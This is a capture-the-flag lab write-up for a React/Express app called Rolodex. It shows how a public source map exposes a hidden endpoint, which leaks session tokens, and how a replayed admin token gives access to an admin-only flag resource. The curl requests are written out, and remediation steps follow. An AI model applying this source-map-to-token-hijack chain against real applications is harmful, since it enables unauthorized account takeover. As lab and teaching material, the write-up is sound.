# Rolodex Pwnbox Lab - Source Map to Token Leak

Date: 2026-06-06
Target type: CTF/lab
Bug class: Information disclosure, missing authorization, session token exposure

## Observation

The root page served a React single-page app named Rolodex from an Express backend.

Initial response indicators:

- `X-Powered-By: Express`
- Cookie set on first visit: `token=usr_[redacted]`
- Main bundle: `/assets/index-DPm9vOq3.js`
- Stylesheet: `/assets/index-Ct_kMsSy.css`

The visible client used these endpoints:

- `/api/products`
- `/api/categories`
- `/api/products/:id`
- `/api/profile`

## Hypothesis

Because the app was a built React SPA, a source map might expose original source files, including routes or constants removed from the production bundle.

## Evidence

The source map was publicly reachable:

```text
/assets/index-DPm9vOq3.js.map
```

It contained original source entries:

```text
../../src/api/endpoints.ts
../../src/api/client.ts
../../src/main.tsx
```

`endpoints.ts` included an unused constant:

```ts
export const USER_LOGS = '/api/users/logs'
```

The built JavaScript bundle did not visibly expose this endpoint because the constant was unused by the app and removed from the production bundle.

## Test

Request the hidden endpoint directly:

```bash
curl -i https://[lab-host]/api/users/logs
```

## Result

The endpoint returned `200 OK` with JSON containing usernames, roles, and active session tokens. It included one admin user:

```json
{
  "username": "sable-admin",
  "role": "admin",
  "token": "adm_[redacted]"
}
```

Using the disclosed admin token against `/api/profile` returned an admin profile:

```bash
curl -i -H 'Cookie: token=adm_[redacted]' https://[lab-host]/api/profile
```

Result:

```json
{
  "username": "sable-admin",
  "role": "admin",
  "orders": 128,
  "saved": 0
}
```

The stylesheet referenced an admin-only background path:

```css
.profile.admin {
  background-image: url(/twleoknsdcsbu);
}
```

Without the admin token, `/twleoknsdcsbu` returned `404`. With the leaked admin token, it returned an SVG containing the lab flag. The flag is intentionally not copied here.

## Conclusion

Confirmed chain:

```text
Public source map
-> hidden endpoint discovery
-> unauthenticated user log access
-> active token disclosure
-> admin session impersonation
-> admin-only resource access
```

## Failed Assumptions

- Directly opening source paths like `/src/main.tsx` does not work because `sources` entries are build-time file labels, not public URLs.
- Common route status checks were noisy because the SPA returned `200` fallback HTML for many paths.
- Simple token tampering such as `token=admin` or changing `usr_` to `adm_` did not grant access.

## Why The Working Test Worked

The source map included `sourcesContent`, which exposed original source text. That source text included a hidden endpoint constant. The endpoint itself lacked authorization and returned active tokens.

## Fix

- Disable production source map publication or restrict access to source maps.
- Remove unused sensitive endpoint constants from client code.
- Require authentication and authorization on `/api/users/logs`.
- Never return raw session tokens in logs or user-list responses.
- Rotate all exposed tokens.
- Set session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite`.

## Future Checklist Item

When reviewing built SPAs, always test for `.js.map`, extract `sourcesContent`, search for unused route constants, then verify whether discovered endpoints are real backend routes or SPA fallback HTML.
